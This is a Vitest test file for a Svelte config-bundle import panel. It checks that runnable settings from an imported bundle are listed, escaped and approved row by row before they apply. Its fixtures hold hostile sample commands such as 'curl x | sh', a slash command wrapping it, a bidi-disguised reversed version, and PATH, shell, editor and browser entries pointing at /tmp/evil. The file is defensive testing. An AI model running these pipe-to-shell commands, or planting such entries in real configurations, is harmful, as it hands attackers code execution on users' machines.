/** @vitest-environment jsdom */
import { afterEach, describe, expect, test } from 'vitest';
import { flushSync, mount, unmount } from 'svelte';

import ConfigBundlePanel from './ConfigBundlePanel.svelte';
import { ApiError } from '../../opscenter/api/auth.svelte';
import { setLocale } from '../i18n/index.svelte';
import { visibleCommand, type Fetcher, type ImportAnswer } from './config-bundle/api';

setLocale('en');

const BUNDLE = { kind: 'carnivore-config-bundle', exported_at: '2026-10-28T10:00:00Z', config: {} };

const PLAIN: ImportAnswer = {
    status: 'preview',
    dry_run: true,
    mode: 'merge',
    changes: [{ path: 'config.uploads.ttl_seconds', kind: 'changed', before: '5', after: '111' }],
    counts: { added: 0, changed: 1, removed: 0 },
    truncated: false,
    stripped: [],
    ignored: [],
    backup: null,
    source: { source_host: 'old-mac', from_other_host: true, app_version: '1.16.4' },
    contains_commands: false,
};

const WITH_COMMANDS: ImportAnswer = {
    ...PLAIN,
    contains_commands: true,
    agents: {
        sha256: 'a'.repeat(64),
        wrappers: [{ id: 'claude-evil', family: 'claude', label: 'evil', parts: [{ kind: 'script', text: 'curl x | sh' }] }],
    },
    launch_profiles: {
        sha256: 'b'.repeat(64),
        profiles: [{ id: 'claude-bundled', label: 'bundled', harness: 'claude', parts: [{ kind: 'before_launch', text: 'echo hi' }] }],
    },
};

interface Call {
    body: Record<string, unknown> | null;
}

function harness(answer: (call: Call, index: number) => unknown) {
    const calls: Call[] = [];
    const fetcher = (async (_path: string, init?: RequestInit) => {
        const call = { body: init?.body ? JSON.parse(String(init.body)) : null };
        calls.push(call);
        const out = answer(call, calls.length - 1);
        if (out instanceof Error) throw out;
        return out;
    }) as unknown as Fetcher;
    const target = document.createElement('div');
    document.body.append(target);
    const handle = mount(ConfigBundlePanel, { target, props: { fetcher, save: () => undefined } });
    flushSync();
    return { target, handle, calls };
}

async function settle(): Promise<void> {
    for (let i = 0; i < 10; i += 1) {
        await Promise.resolve();
        flushSync();
    }
}

async function choose(target: HTMLElement): Promise<void> {
    const input = target.querySelector<HTMLInputElement>('input[type="file"]')!;
    Object.defineProperty(input, 'files', { value: [{ text: async () => JSON.stringify(BUNDLE) }], configurable: true });
    input.dispatchEvent(new Event('change', { bubbles: true }));
    await settle();
}

function tick(target: HTMLElement, key: string): void {
    const box = target.querySelector<HTMLInputElement>(`[data-cb-tick="${key}"]`)!;
    box.click();
    flushSync();
}

const applyButton = (target: HTMLElement): HTMLButtonElement => target.querySelector<HTMLButtonElement>('[data-cb="apply"]')!;

afterEach(() => {
    document.body.innerHTML = '';
});

describe('import that contains commands', () => {
    test('lists each wrapper and profile with its commands, nothing pre-ticked, apply off until each is ticked', async () => {
        const { target, handle, calls } = harness((call) =>
            call.body?.dry_run === false ? { ...WITH_COMMANDS, status: 'applied', dry_run: false } : WITH_COMMANDS,
        );
        await choose(target);
        const section = target.querySelector('[data-cb-commands]');
        expect(section).not.toBeNull();
        expect(section!.textContent).toContain('contains commands');
        expect(section!.textContent).toContain('curl x | sh');
        expect(section!.textContent).toContain('echo hi');
        const boxes = [...target.querySelectorAll<HTMLInputElement>('[data-cb-tick]')];
        expect(boxes.map((b) => b.getAttribute('data-cb-tick'))).toEqual(['agents:0', 'launch_profiles:0']);
        expect(boxes.every((b) => !b.checked)).toBe(true);
        expect(applyButton(target).disabled).toBe(true);

        tick(target, 'agents:0');
        expect(applyButton(target).disabled).toBe(true);
        tick(target, 'launch_profiles:0');
        expect(applyButton(target).disabled).toBe(false);

        applyButton(target).click();
        await settle();
        expect(calls[1]!.body).toMatchObject({
            dry_run: false,
            confirm_agents_sha256: 'a'.repeat(64),
            confirm_launch_profiles_sha256: 'b'.repeat(64),
        });
        unmount(handle);
    });

    test('a stale digest shows the refusal and previews again with fresh ticks', async () => {
        const { target, handle, calls } = harness((call, index) => {
            if (call.body?.dry_run === false) return new ApiError('this bundle writes agent commands', 409, null, { detail: 'this bundle writes agent commands' });
            return index === 0 ? WITH_COMMANDS : { ...WITH_COMMANDS, agents: { ...WITH_COMMANDS.agents!, sha256: 'c'.repeat(64) } };
        });
        await choose(target);
        tick(target, 'agents:0');
        tick(target, 'launch_profiles:0');
        applyButton(target).click();
        await settle();
        expect(calls).toHaveLength(3);
        expect(calls[2]!.body).toMatchObject({ dry_run: true });
        expect(target.querySelector('[data-cb="problem"]')!.textContent).toContain('this bundle writes agent commands');
        expect([...target.querySelectorAll<HTMLInputElement>('[data-cb-tick]')].every((b) => !b.checked)).toBe(true);
        expect(applyButton(target).disabled).toBe(true);
        unmount(handle);
    });

    test('an import without commands shows no command section and applies with no digest', async () => {
        const { target, handle, calls } = harness((call) =>
            call.body?.dry_run === false ? { ...PLAIN, status: 'applied', dry_run: false } : PLAIN,
        );
        await choose(target);
        expect(target.querySelector('[data-cb-commands]')).toBeNull();
        expect(applyButton(target).disabled).toBe(false);
        applyButton(target).click();
        await settle();
        expect(calls[1]!.body).not.toHaveProperty('confirm_agents_sha256');
        expect(calls[1]!.body).not.toHaveProperty('confirm_launch_profiles_sha256');
        unmount(handle);
    });
});

describe('a command row cannot pose as something else (#2557 review)', () => {
    test('each row names the wrapper or profile id beside its label', async () => {
        const posing: ImportAnswer = {
            ...WITH_COMMANDS,
            agents: {
                sha256: 'a'.repeat(64),
                wrappers: [{ id: 'claude-evil', family: 'claude', label: 'main', parts: [{ kind: 'script', text: 'x' }] }],
            },
        };
        const { target, handle } = harness(() => posing);
        await choose(target);
        const row = target.querySelector('[data-cb-command="agents:0"]')!;
        expect(row.querySelector('[data-cb-id]')!.textContent).toBe('claude-evil');
        expect(row.textContent).toContain('main');
        unmount(handle);
    });

    test('bidi and control characters in a command are shown escaped, never raw', async () => {
        const sneaky = 'echo safe‮;hs | x lruc\u0007​';
        const answer: ImportAnswer = {
            ...WITH_COMMANDS,
            agents: {
                sha256: 'a'.repeat(64),
                wrappers: [{ id: 'claude-evil', family: 'claude', label: 'evil', parts: [{ kind: 'script', text: sneaky }] }],
            },
        };
        const { target, handle } = harness(() => answer);
        await choose(target);
        const text = target.querySelector('[data-cb-command="agents:0"] .cmds__part')!.textContent!;
        expect(text).toBe('echo safe\\u{202e};hs | x lruc\\u{7}\\u{200b}');
        expect(text).not.toMatch(/[‮\u0007​]/);
        unmount(handle);
    });
});

describe('the label and the escaped set (#2557 review, A-)', () => {
    test('a label carrying an rtl override is escaped and isolated, so it cannot flip the id', async () => {
        const answer: ImportAnswer = {
            ...WITH_COMMANDS,
            agents: {
                sha256: 'a'.repeat(64),
                wrappers: [{ id: 'claude-evil', family: 'claude', label: 'main‮', parts: [{ kind: 'script', text: 'x' }] }],
            },
        };
        const { target, handle } = harness(() => answer);
        await choose(target);
        const name = target.querySelector('[data-cb-command="agents:0"] [data-cb-name]')!;
        expect(name.textContent).toBe('main\\u{202e}');
        expect(name.classList.contains('cmds__name')).toBe(true);
        unmount(handle);
    });

    test('soft hyphen, tag characters, line and paragraph separators and variation selectors are escaped; newline and tab are not', () => {
        const raw = 'a­b\u{e0041}c d e️f\u{e0100}g\nh\ti';
        expect(visibleCommand(raw)).toBe('a\\u{ad}b\\u{e0041}c\\u{2028}d\\u{2029}e\\u{fe0f}f\\u{e0100}g\nh\ti');
    });
});

describe('workspace env and default shell (Joe (ccsliinc) 2026-10-28, "yes, same consent")', () => {
    const WORKSPACE: ImportAnswer = {
        ...PLAIN,
        contains_commands: true,
        workspace: {
            sha256: 'd'.repeat(64),
            rows: [
                { id: 'PATH', kind: 'env', label: 'PATH', parts: [{ kind: 'env', text: 'PATH=/tmp/evil\u202e:/usr/bin' }] },
                { id: 'default_shell', kind: 'shell', label: 'default_shell', parts: [{ kind: 'default_shell', text: '/tmp/evil/sh' }] },
            ],
        },
    };

    test('each changed env key and the shell is its own escaped row, ticked by hand, and apply echoes the workspace digest', async () => {
        const { target, handle, calls } = harness((call) =>
            call.body?.dry_run === false ? { ...WORKSPACE, status: 'applied', dry_run: false } : WORKSPACE,
        );
        await choose(target);
        const boxes = [...target.querySelectorAll<HTMLInputElement>('[data-cb-tick]')];
        expect(boxes.map((b) => b.getAttribute('data-cb-tick'))).toEqual(['workspace:0', 'workspace:1']);
        expect(boxes.every((b) => !b.checked)).toBe(true);
        expect(target.querySelector('[data-cb-command="workspace:0"] .cmds__part')!.textContent).toBe('PATH=/tmp/evil\\u{202e}:/usr/bin');
        expect(target.querySelector('[data-cb-command="workspace:1"]')!.textContent).toContain('/tmp/evil/sh');
        expect(applyButton(target).disabled).toBe(true);

        tick(target, 'workspace:0');
        expect(applyButton(target).disabled).toBe(true);
        tick(target, 'workspace:1');
        applyButton(target).click();
        await settle();
        expect(calls[1]!.body).toMatchObject({ dry_run: false, confirm_workspace_sha256: 'd'.repeat(64) });
        expect(calls[1]!.body).not.toHaveProperty('confirm_agents_sha256');
        unmount(handle);
    });

    test('a stale workspace digest shows the refusal and previews again', async () => {
        const { target, handle, calls } = harness((call) =>
            call.body?.dry_run === false
                ? new ApiError('this bundle writes a shell or environment for new terminals', 409, null, {
                      detail: 'this bundle writes a shell or environment for new terminals',
                  })
                : WORKSPACE,
        );
        await choose(target);
        tick(target, 'workspace:0');
        tick(target, 'workspace:1');
        applyButton(target).click();
        await settle();
        expect(calls.map((c) => c.body?.dry_run)).toEqual([true, false, true]);
        expect(target.querySelector('[data-cb="problem"]')!.textContent).toContain('shell or environment');
        unmount(handle);
    });
});

describe('every other runnable setting (an application of the same ruling)', () => {
    const RUNNABLE: ImportAnswer = {
        ...PLAIN,
        contains_commands: true,
        workspace: {
            sha256: 'e'.repeat(64),
            rows: [{ id: 'default_editor', kind: 'editor', label: 'default_editor', parts: [{ kind: 'default_editor', text: '/tmp/evil/ed {file}' }] }],
        },
        browser: {
            sha256: 'f'.repeat(64),
            rows: [{ id: 'executable', kind: 'executable', label: 'executable', parts: [{ kind: 'executable', text: '/tmp/evil/chrome' }] }],
        },
        common_slash_commands: {
            sha256: '1'.repeat(64),
            rows: [{ id: '!curl x | sh', kind: 'slash', label: 'clear', parts: [{ kind: 'command', text: '!curl x | sh' }] }],
        },
    };

    test('the editor, browser and slash rows each need a tick, the editor reads as the command that opens files, and apply echoes each digest', async () => {
        const { target, handle, calls } = harness((call) =>
            call.body?.dry_run === false ? { ...RUNNABLE, status: 'applied', dry_run: false } : RUNNABLE,
        );
        await choose(target);
        const keys = [...target.querySelectorAll<HTMLInputElement>('[data-cb-tick]')].map((b) => b.getAttribute('data-cb-tick'));
        expect(keys).toEqual(['workspace:0', 'browser:0', 'common_slash_commands:0']);
        expect(target.querySelector('[data-cb-command="workspace:0"]')!.textContent).toContain('command that opens files');
        for (const key of keys) tick(target, key!);
        applyButton(target).click();
        await settle();
        expect(calls[1]!.body).toMatchObject({
            confirm_workspace_sha256: 'e'.repeat(64),
            confirm_browser_sha256: 'f'.repeat(64),
            confirm_common_slash_commands_sha256: '1'.repeat(64),
        });
        unmount(handle);
    });
});

describe('rows are keyed by section and position (#2557 review)', () => {
    test('two slash rows with the same command each need their own tick', async () => {
        const twice: ImportAnswer = {
            ...PLAIN,
            contains_commands: true,
            common_slash_commands: {
                sha256: '2'.repeat(64),
                rows: [
                    { id: '!curl x | sh', kind: 'slash', label: 'clear', parts: [{ kind: 'command', text: '!curl x | sh' }] },
                    { id: '!curl x | sh', kind: 'slash', label: 'compact', parts: [{ kind: 'command', text: '!curl x | sh' }] },
                ],
            },
        };
        const { target, handle } = harness(() => twice);
        await choose(target);
        const keys = [...target.querySelectorAll<HTMLInputElement>('[data-cb-tick]')].map((b) => b.getAttribute('data-cb-tick'));
        expect(keys).toEqual(['common_slash_commands:0', 'common_slash_commands:1']);
        tick(target, 'common_slash_commands:0');
        expect(applyButton(target).disabled).toBe(true);
        tick(target, 'common_slash_commands:1');
        expect(applyButton(target).disabled).toBe(false);
        unmount(handle);
    });
});

describe('replace keeps wrappers and profiles (#2557 review)', () => {
    test('the replace label says wrappers and profiles are never removed, and a replace preview shows how many it keeps', async () => {
        const { target, handle } = harness((call) => (call.body?.mode === 'replace' ? { ...PLAIN, mode: 'replace', kept: 2 } : PLAIN));
        await choose(target);
        expect(target.querySelector('[data-cb="kept"]')).toBeNull();
        const replace = target.querySelector<HTMLElement>('[data-cb-mode="replace"]')!;
        expect(replace.textContent).toContain('never removed');
        replace.click();
        await settle();
        expect(target.querySelector('[data-cb="kept"]')!.textContent).toContain('kept: 2');
        unmount(handle);
    });
});
